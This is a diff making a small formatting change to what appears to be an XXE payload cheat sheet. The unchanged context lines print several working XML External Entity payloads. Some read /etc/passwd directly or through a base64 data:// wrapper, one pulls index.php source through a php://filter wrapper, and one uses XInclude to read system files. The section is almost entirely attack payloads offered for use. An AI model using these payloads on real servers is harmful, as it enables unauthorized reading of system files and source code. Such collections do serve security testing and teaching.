@@ -19,7 +19,7 @@ Attackers can read local files or cause SSRF requests from the target server.
 
 ## Detection Payload
 
-``` xml
+```xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
  <userInfo>
@@ -32,13 +32,13 @@ Attackers can read local files or cause SSRF requests from the target server.
 
 ### Classic XXE
 
-``` xml
+```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
 ```
 
 ---
 
-``` xml
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE data [
 <!ELEMENT data (#ANY)>
@@ -49,7 +49,7 @@ Attackers can read local files or cause SSRF requests from the target server.
 
 ---
 
-``` xml
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
   <!DOCTYPE foo [
   <!ELEMENT foo ANY >
@@ -58,13 +58,13 @@ Attackers can read local files or cause SSRF requests from the target server.
 
 ### Classic XXE Base64 encoded
 
-``` xml
+```xml
 <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
 ```
 
 ### PHP Wrapper inside XXE
 
-``` xml
+```xml
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <contacts>
   <contact>
@@ -79,7 +79,7 @@ Attackers can read local files or cause SSRF requests from the target server.
 
 ---
 
-``` xml
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
@@ -90,7 +90,7 @@ Attackers can read local files or cause SSRF requests from the target server.
 
 ### XInclude attacks
 
-``` xml
+```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
